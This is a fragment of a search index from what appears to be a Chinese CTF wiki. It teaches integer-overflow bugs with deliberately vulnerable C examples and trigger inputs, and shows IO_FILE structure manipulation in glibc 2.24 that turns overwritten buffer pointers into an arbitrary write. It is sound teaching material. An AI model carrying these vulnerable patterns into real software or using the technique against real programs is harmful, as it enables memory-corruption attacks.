4byte(dword) 0~4294967295(0~0xffffffff) long int 8byte(qword) \u6b63: 0~0x7fffffffffffffff \u8d1f:0x8000000000000000~0xffffffffffffffff unsigned long int 8byte(qword) 0~0xffffffffffffffff \u5f53\u7a0b\u5e8f\u4e2d\u7684\u6570\u636e\u8d85\u8fc7\u5176\u6570\u636e\u7c7b\u578b\u7684\u8303\u56f4\uff0c\u5219\u4f1a\u9020\u6210\u6ea2\u51fa\uff0c\u6574\u6570\u7c7b\u578b\u7684\u6ea2\u51fa\u88ab\u79f0\u4e3a\u6574\u6570\u6ea2\u51fa\u3002","title":"\u4ecb\u7ecd"},{"location":"pwn/integeroverflow/intof/#_3","text":"\u63a5\u4e0b\u6765\u7b80\u5355\u9610\u8ff0\u4e0b\u6574\u6570\u6ea2\u51fa\u7684\u539f\u7406","title":"\u539f\u7406"},{"location":"pwn/integeroverflow/intof/#_4","text":"# \u4f2a\u4ee3\u7801 short int a; a = a + 1; # \u5bf9\u5e94\u7684\u6c47\u7f16 movzx eax, word ptr [rbp - 0x1c] add eax, 1 mov word ptr [rbp - 0x1c], ax unsigned short int b; b = b + 1; # assembly code add word ptr [rbp - 0x1a], 1 \u4e0a\u754c\u6ea2\u51fa\u6709\u4e24\u79cd\u60c5\u51b5\uff0c\u4e00\u79cd\u662f 0x7fff + 1 \uff0c \u53e6\u4e00\u79cd\u662f 0xffff + 1 \u3002 \u56e0\u4e3a\u8ba1\u7b97\u673a\u5e95\u5c42\u6307\u4ee4\u662f\u4e0d\u533a\u5206\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\u7684\uff0c\u6570\u636e\u90fd\u662f\u4ee5\u4e8c\u8fdb\u5236\u5f62\u5f0f\u5b58\u5728(\u7f16\u8bd1\u5668\u7684\u5c42\u9762\u624d\u5bf9\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\u8fdb\u884c\u533a\u5206\uff0c\u4ea7\u751f\u4e0d\u540c\u7684\u6c47\u7f16\u6307\u4ee4)\u3002 \u6240\u4ee5 add 0x7fff, 1 == 0x8000 \uff0c\u8fd9\u79cd\u4e0a\u754c\u6ea2\u51fa\u5bf9\u65e0\u7b26\u53f7\u6574\u578b\u5c31\u6ca1\u6709\u5f71\u54cd\uff0c\u4f46\u662f\u5728\u6709\u7b26\u53f7\u77ed\u6574\u578b\u4e2d\uff0c 0x7fff \u8868\u793a\u7684\u662f 32767 \uff0c\u4f46\u662f 0x8000 \u8868\u793a\u7684\u662f -32768 \uff0c\u7528\u6570\u5b66\u8868\u8fbe\u5f0f\u6765\u8868\u793a\u5c31\u662f\u5728\u6709\u7b26\u53f7\u77ed\u6574\u578b\u4e2d 32767+1 == -32768 \u3002 \u7b2c\u4e8c\u79cd\u60c5\u51b5\u662f add 0xffff, 1 \uff0c\u8fd9\u79cd\u60c5\u51b5\u9700\u8981\u8003\u8651\u7684\u662f\u7b2c\u4e00\u4e2a\u64cd\u4f5c\u6570\u3002 \u6bd4\u5982\u4e0a\u9762\u7684\u6709\u7b26\u53f7\u578b\u52a0\u6cd5\u7684\u6c47\u7f16\u4ee3\u7801\u662f add eax, 1 \uff0c\u56e0\u4e3a eax=0xffff \uff0c\u6240\u4ee5 add eax, 1 == 0x10000 \uff0c\u4f46\u662f\u65e0\u7b26\u53f7\u7684\u6c47\u7f16\u4ee3\u7801\u662f\u5bf9\u5185\u5b58\u8fdb\u884c\u52a0\u6cd5\u8fd0\u7b97 add word ptr [rbp - 0x1a], 1 == 0x0000 \u3002 \u5728\u6709\u7b26\u53f7\u7684\u52a0\u6cd5\u4e2d\uff0c\u867d\u7136 eax \u7684\u7ed3\u679c\u4e3a 0x10000\uff0c\u4f46\u662f\u53ea\u628a ax=0x0000 \u7684\u503c\u50a8\u5b58\u5230\u4e86\u5185\u5b58\u4e2d\uff0c\u4ece\u7ed3\u679c\u770b\u548c\u65e0\u7b26\u53f7\u662f\u4e00\u6837\u7684\u3002 \u518d\u4ece\u6570\u5b57\u5c42\u9762\u770b\u770b\u8fd9\u79cd\u6ea2\u51fa\u7684\u7ed3\u679c\uff0c\u5728\u6709\u7b26\u53f7\u77ed\u6574\u578b\u4e2d\uff0c 0xffff==-1\uff0c-1 + 1 == 0 \uff0c\u4ece\u6709\u7b26\u53f7\u770b\u8fd9\u79cd\u8ba1\u7b97\u6ca1\u95ee\u9898\u3002 \u4f46\u662f\u5728\u65e0\u7b26\u53f7\u77ed\u6574\u578b\u4e2d\uff0c 0xffff == 65535, 65535 + 1 == 0 \u3002","title":"\u4e0a\u754c\u6ea2\u51fa"},{"location":"pwn/integeroverflow/intof/#_5","text":"\u4e0b\u5c4a\u6ea2\u51fa\u7684\u9053\u7406\u548c\u4e0a\u754c\u6ea2\u51fa\u4e00\u6837\uff0c\u5728\u6c47\u7f16\u4ee3\u7801\u4e2d\uff0c\u53ea\u662f\u628a add \u66ff\u6362\u6210\u4e86 sub \u3002 \u4e00\u6837\u4e5f\u662f\u6709\u4e24\u79cd\u60c5\u51b5\uff1a \u7b2c\u4e00\u79cd\u662f sub 0x0000, 1 == 0xffff \uff0c\u5bf9\u4e8e\u6709\u7b26\u53f7\u6765\u8bf4 0 - 1 == -1 \u6ca1\u95ee\u9898\uff0c\u4f46\u662f\u5bf9\u4e8e\u65e0\u7b26\u53f7\u6765\u8bf4\u5c31\u6210\u4e86 0 - 1 == 65535 \u3002 \u7b2c\u4e8c\u79cd\u662f sub 0x8000, 1 == 0x7fff \uff0c\u5bf9\u4e8e\u65e0\u7b26\u53f7\u6765\u8bf4\u662f 32768 - 1 == 32767 \u662f\u6b63\u786e\u7684\uff0c\u4f46\u662f\u5bf9\u4e8e\u6709\u7b26\u53f7\u6765\u8bf4\u5c31\u53d8\u6210\u4e86 -32768 - 1 = 32767 \u3002","title":"\u4e0b\u754c\u6ea2\u51fa"},{"location":"pwn/integeroverflow/intof/#_6","text":"\u5728\u6211\u89c1\u8fc7\u7684\u6574\u6570\u6ea2\u51fa\u7684\u6f0f\u6d1e\u4e2d\uff0c\u6211\u8ba4\u4e3a\u53ef\u4ee5\u603b\u7ed3\u4e3a\u4e24\u79cd\u60c5\u51b5\u3002","title":"\u4f8b\u5b50"},{"location":"pwn/integeroverflow/intof/#_7","text":"\u8fd9\u79cd\u60c5\u51b5\u5f88\u597d\u7406\u89e3\uff0c\u6bd4\u5982\u6709\u4e00\u4e2a\u56fa\u5b9a\u5927\u5c0f\u7684\u6876\uff0c\u5f80\u91cc\u9762\u5012\u6c34\uff0c\u5982\u679c\u4f60\u6ca1\u6709\u9650\u5236\u5012\u5165\u591a\u5c11\u6c34\uff0c\u90a3\u4e48\u6c34\u5219\u4f1a\u4ece\u6876\u4e2d\u6ea2\u51fa\u6765\u3002 \u4e00\u4e2a\u6709\u56fa\u5b9a\u5927\u5c0f\u7684\u4e1c\u897f\uff0c\u4f60\u6ca1\u6709\u5bf9\u5176\u8fdb\u884c\u7ea6\u675f\uff0c\u5c31\u4f1a\u9020\u6210\u4e0d\u53ef\u9884\u671f\u7684\u540e\u679c\u3002 \u7b80\u5355\u7684\u5199\u4e00\u4e2a\u793a\u4f8b: $ cat test . c #include <stddef.h> int main ( void ) { int len ; int data_len ; int header_len ; char * buf ; header_len = 0x10 ; scanf ( \"%uld\" , & data_len ); len = data_len + header_len buf = malloc ( len ); read ( 0 , buf , data_len ); return 0 ; } $ gcc test . c $ . / a . out - 1 asdfasfasdfasdfafasfasfasdfasdf # gdb a.out \u25ba 0x40066d < main + 71 > call malloc @ plt < 0x400500 > size : 0xf \u53ea\u7533\u8bf7 0x20 \u5927\u5c0f\u7684\u5806\uff0c\u4f46\u662f\u5374\u80fd\u8f93\u5165 0xffffffff \u957f\u5ea6\u7684\u6570\u636e\uff0c\u4ece\u6574\u578b\u6ea2\u51fa\u5230\u5806\u6ea2\u51fa","title":"\u672a\u9650\u5236\u8303\u56f4"},{"location":"pwn/integeroverflow/intof/#_8","text":"\u5373\u4f7f\u6b63\u786e\u7684\u5bf9\u53d8\u91cf\u8fdb\u884c\u7ea6\u675f\uff0c\u4e5f\u4ecd\u7136\u6709\u53ef\u80fd\u51fa\u73b0\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u6211\u8ba4\u4e3a\u53ef\u4ee5\u6982\u62ec\u4e3a\u9519\u8bef\u7684\u7c7b\u578b\u8f6c\u6362\uff0c\u5982\u679c\u7ee7\u7eed\u7ec6\u5206\u4e0b\u53bb\uff0c\u53ef\u4ee5\u5206\u4e3a\uff1a \u8303\u56f4\u5927\u7684\u53d8\u91cf\u8d4b\u503c\u7ed9\u8303\u56f4\u5c0f\u7684\u53d8\u91cf $ cat test2 . c void check ( int n ) { if ( ! n ) printf ( \"vuln\" ); else printf ( \"OK\" ); } int main ( void ) { long int a ; scanf ( \"%ld\" , & a ); if ( a == 0 ) printf ( \"Bad\" ); else check ( a ); return 0 ; } $ gcc test2 . c $ . / a . out 4294967296 vuln \u4e0a\u8ff0\u4ee3\u7801\u5c31\u662f\u4e00\u4e2a\u8303\u56f4\u5927\u7684\u53d8\u91cf(\u957f\u6574\u578ba)\uff0c\u4f20\u5165 check \u51fd\u6570\u540e\u53d8\u4e3a\u8303\u56f4\u5c0f\u7684\u53d8\u91cf(\u6574\u578b\u53d8\u91cfn)\uff0c\u9020\u6210\u6574\u6570\u6ea2\u51fa\u7684\u4f8b\u5b50\u3002 \u5df2\u7ecf\u957f\u6574\u578b\u7684\u5360\u6709 8 byte \u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u800c\u6574\u578b\u53ea\u6709 4 byte \u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u6240\u4ee5\u5f53 long -> int\uff0c\u5c06\u4f1a\u9020\u6210\u622a\u65ad\uff0c\u53ea\u628a\u957f\u6574\u578b\u7684\u4f4e 4byte \u7684\u503c\u4f20\u7ed9\u6574\u578b\u53d8\u91cf\u3002 \u5728\u4e0a\u8ff0\u4f8b\u5b50\u4e2d\uff0c\u5c31\u662f\u628a long: 0x100000000 -> int: 0x00000000 \u3002 \u4f46\u662f\u5f53\u8303\u56f4\u66f4\u5c0f\u7684\u53d8\u91cf\u5c31\u80fd\u5b8c\u5168\u7684\u628a\u503c\u4f20\u9012\u7ed9\u8303\u56f4\u66f4\u5927\u7684\u53d8\u91cf\uff0c\u800c\u4e0d\u4f1a\u9020\u6210\u6570\u636e\u4e22\u5931\u3002 \u53ea\u505a\u4e86\u5355\u8fb9\u9650\u5236 \u8fd9\u79cd\u60c5\u51b5\u53ea\u9488\u5bf9\u6709\u7b26\u53f7\u7c7b\u578b $ cat test3 . c int main ( void ) { int len , l ; char buf [ 11 ]; scanf ( \"%d\" , & len ); if ( len < 10 ) { l = read ( 0 , buf , len ); * ( buf + l ) = 0 ; puts ( buf ); } else printf ( \"Please len < 10\" ); } $ gcc test3 . c $ . / a . out - 1 aaaaaaaaaaaa aaaaaaaaaaaa \u4ece\u8868\u9762\u4e0a\u770b\uff0c\u6211\u4eec\u5bf9\u53d8\u91cf len \u8fdb\u884c\u4e86\u9650\u5236\uff0c\u4f46\u662f\u4ed4\u7ec6\u601d\u8003\u53ef\u4ee5\u53d1\u73b0\uff0clen \u662f\u6709\u7b26\u53f7\u6574\u578b\uff0c\u6240\u4ee5 len \u7684\u957f\u5ea6\u53ef\u4ee5\u4e3a\u8d1f\u6570\uff0c\u4f46\u662f\u5728 read \u51fd\u6570\u4e2d\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u7684\u7c7b\u578b\u662f size_t \uff0c\u8be5\u7c7b\u578b\u76f8\u5f53\u4e8e unsigned long int \uff0c\u5c5e\u4e8e\u65e0\u7b26\u53f7\u957f\u6574\u578b \u4e0a\u9762\u4e3e\u4f8b\u7684\u4e24\u79cd\u60c5\u51b5\u90fd\u6709\u4e00\u4e2a\u5171\u6027\uff0c\u5c31\u662f\u51fd\u6570\u7684\u5f62\u53c2\u548c\u5b9e\u53c2\u7684\u7c7b\u578b\u4e0d\u540c\uff0c\u6240\u4ee5\u6211\u8ba4\u4e3a\u53ef\u4ee5\u603b\u7ed3\u4e3a\u9519\u8bef\u7684\u7c7b\u578b\u8f6c\u6362","title":"\u9519\u8bef\u7684\u7c7b\u578b\u8f6c\u6362"},{"location":"pwn/integeroverflow/intof/#ctf","text":"\u9898\u76ee\uff1a Pwnhub \u6545\u4e8b\u7684\u5f00\u59cb calc","title":"CTF\u4f8b\u9898"},{"location":"pwn/io_file/exploit-in-libc2.24/","text":"\u65b0\u7248\u672clibc\u4e0bIO_FILE\u7684\u5229\u7528 \u00b6 \u4ecb\u7ecd \u00b6 \u5728\u6700\u65b0\u7248\u672c\u7684glibc\u4e2d(2.24)\uff0c\u5168\u65b0\u52a0\u5165\u4e86\u9488\u5bf9IO_FILE_plus\u7684vtable\u52ab\u6301\u7684\u68c0\u6d4b\u63aa\u65bd\uff0cglibc \u4f1a\u5728\u8c03\u7528\u865a\u51fd\u6570\u4e4b\u524d\u9996\u5148\u68c0\u67e5vtable\u5730\u5740\u7684\u5408\u6cd5\u6027\u3002 \u5982\u679cvtable\u662f\u975e\u6cd5\u7684\uff0c\u90a3\u4e48\u4f1a\u5f15\u53d1abort\u3002 \u9996\u5148\u4f1a\u9a8c\u8bc1vtable\u662f\u5426\u4f4d\u4e8e_IO_vtable\u6bb5\u4e2d\uff0c\u5982\u679c\u6ee1\u8db3\u6761\u4ef6\u5c31\u6b63\u5e38\u6267\u884c\uff0c\u5426\u5219\u4f1a\u8c03\u7528_IO_vtable_check\u505a\u8fdb\u4e00\u6b65\u68c0\u67e5\u3002 \u8fd9\u91cc\u7684\u68c0\u67e5\u4f7f\u5f97\u4ee5\u5f80\u4f7f\u7528vtable\u8fdb\u884c\u5229\u7528\u7684\u6280\u672f\u5f88\u96be\u5b9e\u73b0 \u65b0\u7684\u5229\u7528\u6280\u672f \u00b6 \u5728vtable\u96be\u4ee5\u88ab\u5229\u7528\u4e4b\u540e\uff0c\u5229\u7528\u7684\u5173\u6ce8\u70b9\u4ecevtable\u8f6c\u79fb\u5230_IO_FILE\u7ed3\u6784\u5185\u90e8\u7684\u57df\u4e2d\u3002 \u524d\u9762\u4ecb\u7ecd\u8fc7_IO_FILE\u5728\u4f7f\u7528\u6807\u51c6IO\u5e93\u65f6\u4f1a\u8fdb\u884c\u521b\u5efa\u5e76\u8d1f\u8d23\u7ef4\u62a4\u4e00\u4e9b\u76f8\u5173\u4fe1\u606f\uff0c\u5176\u4e2d\u6709\u4e00\u4e9b\u57df\u662f\u8868\u793a\u8c03\u7528\u8bf8\u5982fwrite\u3001fread\u7b49\u51fd\u6570\u65f6\u5199\u5165\u5730\u5740\u6216\u8bfb\u53d6\u5730\u5740\u7684\uff0c\u5982\u679c\u53ef\u4ee5\u63a7\u5236\u8fd9\u4e9b\u6570\u636e\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u6216\u4efb\u610f\u5730\u5740\u8bfb\u3002 struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; int _flags2; _IO_off_t _old_offset; /* This used to be _offset but it's too small. */ }; \u56e0\u4e3a\u8fdb\u7a0b\u4e2d\u5305\u542b\u4e86\u7cfb\u7edf\u9ed8\u8ba4\u7684\u4e09\u4e2a\u6587\u4ef6\u6d41stdin\\stdout\\stderr\uff0c\u56e0\u6b64\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u4e0d\u9700\u8981\u8fdb\u7a0b\u4e2d\u5b58\u5728\u6587\u4ef6\u64cd\u4f5c\uff0c\u901a\u8fc7scanf\\printf\u4e00\u6837\u53ef\u4ee5\u8fdb\u884c\u5229\u7528\u3002 \u5728_IO_FILE\u4e2d_IO_buf_base\u8868\u793a\u64cd\u4f5c\u7684\u8d77\u59cb\u5730\u5740\uff0c_IO_buf_end\u8868\u793a\u7ed3\u675f\u5730\u5740\uff0c\u901a\u8fc7\u63a7\u5236\u8fd9\u4e24\u4e2a\u6570\u636e\u53ef\u4ee5\u5b9e\u73b0\u63a7\u5236\u8bfb\u5199\u7684\u64cd\u4f5c\u3002 \u793a\u4f8b \u00b6 \u7b80\u5355\u7684\u89c2\u5bdf\u4e00\u4e0b_IO_FILE\u5bf9\u4e8e\u8c03\u7528scanf\u7684\u4f5c\u7528 #include \"stdio.h\" char buf[100]; int main() { char stack_buf[100]; scanf(\"%s\",stack_buf); scanf(\"%s\",stack_buf); } \u5728\u6267\u884c\u7a0b\u5e8f\u7b2c\u4e00\u6b21\u4f7f\u7528stdin\u4e4b\u524d\uff0cstdin\u7684\u5185\u5bb9\u8fd8\u672a\u521d\u59cb\u5316\u662f\u7a7a\u7684 0x7ffff7dd18e0 <_IO_2_1_stdin_>: 0x00000000fbad2088 0x0000000000000000 0x7ffff7dd18f0 <_IO_2_1_stdin_+16>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1900 <_IO_2_1_stdin_+32>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1910 <_IO_2_1_stdin_+48>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1920 <_IO_2_1_stdin_+64>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1930 <_IO_2_1_stdin_+80>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1940 <_IO_2_1_stdin_+96>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1950 <_IO_2_1_stdin_+112>: 0x0000000000000000 0xffffffffffffffff 0x7ffff7dd1960 <_IO_2_1_stdin_+128>: 0x0000000000000000 0x00007ffff7dd3790 0x7ffff7dd1970 <_IO_2_1_stdin_+144>: 0xffffffffffffffff 0x0000000000000000 0x7ffff7dd1980 <_IO_2_1_stdin_+160>: 0x00007ffff7dd19c0 0x0000000000000000 0x7ffff7dd1990 <_IO_2_1_stdin_+176>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19a0 <_IO_2_1_stdin_+192>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19b0 <_IO_2_1_stdin_+208>: 0x0000000000000000 0x00007ffff7dd06e0 <== vtable \u8c03\u7528scanf\u4e4b\u540e\u53ef\u4ee5\u770b\u5230_IO_read_ptr\u3001_IO_read_base\u3001_IO_read_end\u3001_IO_buf_base\u3001_IO_buf_end\u7b49\u57df\u90fd\u88ab\u521d\u59cb\u5316 0x7ffff7dd18e0 <_IO_2_1_stdin_>: 0x00000000fbad2288 0x0000000000602013 0x7ffff7dd18f0 <_IO_2_1_stdin_+16>: 0x0000000000602014 0x0000000000602010 0x7ffff7dd1900 <_IO_2_1_stdin_+32>: 0x0000000000602010 0x0000000000602010 0x7ffff7dd1910 <_IO_2_1_stdin_+48>: 0x0000000000602010 0x0000000000602010 0x7ffff7dd1920 <_IO_2_1_stdin_+64>: 0x0000000000602410 0x0000000000000000 0x7ffff7dd1930 <_IO_2_1_stdin_+80>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1940 <_IO_2_1_stdin_+96>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1950 <_IO_2_1_stdin_+112>: 0x0000000000000000 0xffffffffffffffff 0x7ffff7dd1960 <_IO_2_1_stdin_+128>: 0x0000000000000000 0x00007ffff7dd3790 0x7ffff7dd1970 <_IO_2_1_stdin_+144>: 0xffffffffffffffff 0x0000000000000000 0x7ffff7dd1980 <_IO_2_1_stdin_+160>: 0x00007ffff7dd19c0 0x0000000000000000 0x7ffff7dd1990 <_IO_2_1_stdin_+176>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19a0 <_IO_2_1_stdin_+192>: 0x00000000ffffffff 0x0000000000000000 0x7ffff7dd19b0 <_IO_2_1_stdin_+208>: 0x0000000000000000 0x00007ffff7dd06e0 \u8fdb\u4e00\u6b65\u601d\u8003\u53ef\u4ee5\u53d1\u73b0\u5176\u5b9estdin\u521d\u59cb\u5316\u7684\u5185\u5b58\u662f\u5728\u5806\u4e0a\u5206\u914d\u51fa\u6765\u7684\uff0c\u5728\u8fd9\u91cc\u5806\u7684\u57fa\u5740\u662f0x602000\uff0c\u56e0\u4e3a\u4e4b\u524d\u6ca1\u6709\u5806\u5206\u914d\u56e0\u6b64\u7f13\u51b2\u533a\u7684\u5730\u5740\u4e5f\u662f0x602010 Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/tst/1/t1 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/tst/1/t1 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/tst/1/t1 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] \u5206\u914d\u7684\u5806\u5927\u5c0f\u662f0x400\u4e2a\u5b57\u8282\uff0c\u6b63\u597d\u5bf9\u5e94\u4e8e_IO_buf_base\uff5e_IO_buf_end \u5728\u8fdb\u884c\u5199\u5165\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u7f13\u51b2\u533a\u4e2d\u6709\u6211\u4eec\u5199\u5165\u7684\u6570\u636e\uff0c\u4e4b\u540e\u76ee\u7684\u5730\u5740\u6808\u4e2d\u7684\u7f13\u51b2\u533a\u4e5f\u4f1a\u5199\u5165\u6570\u636e 0x602000: 0x0000000000000000 0x0000000000000411 <== \u5206\u914d0x400\u5927\u5c0f 0x602010: 0x000000000a333231 0x0000000000000000 <== \u7f13\u51b2\u6570\u636e 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 \u63a5\u4e0b\u6765\u6211\u4eec\u5c1d\u8bd5\u4fee\u6539_IO_buf_base\u6765\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\uff0c\u5168\u5c40\u7f13\u51b2\u533abuf\u7684\u5730\u5740\u662f0x7ffff7dd2740\u3002\u4fee\u6539_IO_buf_base\u548c_IO_buf_end\u5230\u7f13\u51b2\u533abuf\u7684\u5730\u5740 0x7ffff7dd18e0 <_IO_2_1_stdin_>: 0x00000000fbad2288 0x0000000000602013 0x7ffff7dd18f0 <_IO_2_1_stdin_+16>: 0x0000000000602014 0x0000000000602010 0x7ffff7dd1900 <_IO_2_1_stdin_+32>: 0x0000000000602010 0x0000000000602010 0x7ffff7dd1910 <_IO_2_1_stdin_+48>: 0x0000000000602010 0x00007ffff7dd2740 <== _IO_buf_base 0x7ffff7dd1920 <_IO_2_1_stdin_+64>: 0x00007ffff7dd27c0 0x0000000000000000 <== _IO_buf_end 0x7ffff7dd1930 <_IO_2_1_stdin_+80>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1940 <_IO_2_1_stdin_+96>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1950 <_IO_2_1_stdin_+112>: 0x0000000000000000 0xffffffffffffffff 0x7ffff7dd1960 <_IO_2_1_stdin_+128>: 0x0000000000000000 0x00007ffff7dd3790 0x7ffff7dd1970 <_IO_2_1_stdin_+144>: 0xffffffffffffffff 0x0000000000000000 0x7ffff7dd1980 <_IO_2_1_stdin_+160>: 0x00007ffff7dd19c0 0x0000000000000000 0x7ffff7dd1990 <_IO_2_1_stdin_+176>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19a0 <_IO_2_1_stdin_+192>: 0x00000000ffffffff 0x0000000000000000 0x7ffff7dd19b0 <_IO_2_1_stdin_+208>: 0x0000000000000000 0x00007ffff7dd06e0 \u4e4b\u540escanf\u7684\u8bfb\u5165\u6570\u636e\u5c31\u4f1a\u5199\u5165\u52300x7ffff7dd2740\u7684\u4f4d\u7f6e 0x7ffff7dd2740 <buf>: 0x00000a6161616161 0x0000000000000000 0x7ffff7dd2750 <buffer>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd2760 <buffer>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd2770 <buffer>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd2780 <buffer>: 0x0000000000000000 0x0000000000000000","title":"\u65b0\u7248\u672c libc \u4e0b IO_FILE \u7684\u5229\u7528"},{"location":"pwn/io_file/exploit-in-libc2.24/#libcio_file","text":"","title":"\u65b0\u7248\u672clibc\u4e0bIO_FILE\u7684\u5229\u7528"},{"location":"pwn/io_file/exploit-in-libc2.24/#_1","text":"\u5728\u6700\u65b0\u7248\u672c\u7684glibc\u4e2d(2.24)\uff0c\u5168\u65b0\u52a0\u5165\u4e86\u9488\u5bf9IO_FILE_plus\u7684vtable\u52ab\u6301\u7684\u68c0\u6d4b\u63aa\u65bd\uff0cglibc \u4f1a\u5728\u8c03\u7528\u865a\u51fd\u6570\u4e4b\u524d\u9996\u5148\u68c0\u67e5vtable\u5730\u5740\u7684\u5408\u6cd5\u6027\u3002 \u5982\u679cvtable\u662f\u975e\u6cd5\u7684\uff0c\u90a3\u4e48\u4f1a\u5f15\u53d1abort\u3002 \u9996\u5148\u4f1a\u9a8c\u8bc1vtable\u662f\u5426\u4f4d\u4e8e_IO_vtable\u6bb5\u4e2d\uff0c\u5982\u679c\u6ee1\u8db3\u6761\u4ef6\u5c31\u6b63\u5e38\u6267\u884c\uff0c\u5426\u5219\u4f1a\u8c03\u7528_IO_vtable_check\u505a\u8fdb\u4e00\u6b65\u68c0\u67e5\u3002 \u8fd9\u91cc\u7684\u68c0\u67e5\u4f7f\u5f97\u4ee5\u5f80\u4f7f\u7528vtable\u8fdb\u884c\u5229\u7528\u7684\u6280\u672f\u5f88\u96be\u5b9e\u73b0","title":"\u4ecb\u7ecd"},{"location":"pwn/io_file/exploit-in-libc2.24/#_2","text":"\u5728vtable\u96be\u4ee5\u88ab\u5229\u7528\u4e4b\u540e\uff0c\u5229\u7528\u7684\u5173\u6ce8\u70b9\u4ecevtable\u8f6c\u79fb\u5230_IO_FILE\u7ed3\u6784\u5185\u90e8\u7684\u57df\u4e2d\u3002 \u524d\u9762\u4ecb\u7ecd\u8fc7_IO_FILE\u5728\u4f7f\u7528\u6807\u51c6IO\u5e93\u65f6\u4f1a\u8fdb\u884c\u521b\u5efa\u5e76\u8d1f\u8d23\u7ef4\u62a4\u4e00\u4e9b\u76f8\u5173\u4fe1\u606f\uff0c\u5176\u4e2d\u6709\u4e00\u4e9b\u57df\u662f\u8868\u793a\u8c03\u7528\u8bf8\u5982fwrite\u3001fread\u7b49\u51fd\u6570\u65f6\u5199\u5165\u5730\u5740\u6216\u8bfb\u53d6\u5730\u5740\u7684\uff0c\u5982\u679c\u53ef\u4ee5\u63a7\u5236\u8fd9\u4e9b\u6570\u636e\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u6216\u4efb\u610f\u5730\u5740\u8bfb\u3002 struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; int _flags2; _IO_off_t _old_offset; /* This used to be _offset but it's too small. */ }; \u56e0\u4e3a\u8fdb\u7a0b\u4e2d\u5305\u542b\u4e86\u7cfb\u7edf\u9ed8\u8ba4\u7684\u4e09\u4e2a\u6587\u4ef6\u6d41stdin\\stdout\\stderr\uff0c\u56e0\u6b64\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u4e0d\u9700\u8981\u8fdb\u7a0b\u4e2d\u5b58\u5728\u6587\u4ef6\u64cd\u4f5c\uff0c\u901a\u8fc7scanf\\printf\u4e00\u6837\u53ef\u4ee5\u8fdb\u884c\u5229\u7528\u3002 \u5728_IO_FILE\u4e2d_IO_buf_base\u8868\u793a\u64cd\u4f5c\u7684\u8d77\u59cb\u5730\u5740\uff0c_IO_buf_end\u8868\u793a\u7ed3\u675f\u5730\u5740\uff0c\u901a\u8fc7\u63a7\u5236\u8fd9\u4e24\u4e2a\u6570\u636e\u53ef\u4ee5\u5b9e\u73b0\u63a7\u5236\u8bfb\u5199\u7684\u64cd\u4f5c\u3002","title":"\u65b0\u7684\u5229\u7528\u6280\u672f"},{"location":"pwn/io_file/exploit-in-libc2.24/#_3","text":"\u7b80\u5355\u7684\u89c2\u5bdf\u4e00\u4e0b_IO_FILE\u5bf9\u4e8e\u8c03\u7528scanf\u7684\u4f5c\u7528 #include \"stdio.h\" char buf[100]; int main() { char stack_buf[100]; scanf(\"%s\",stack_buf); scanf(\"%s\",stack_buf); } 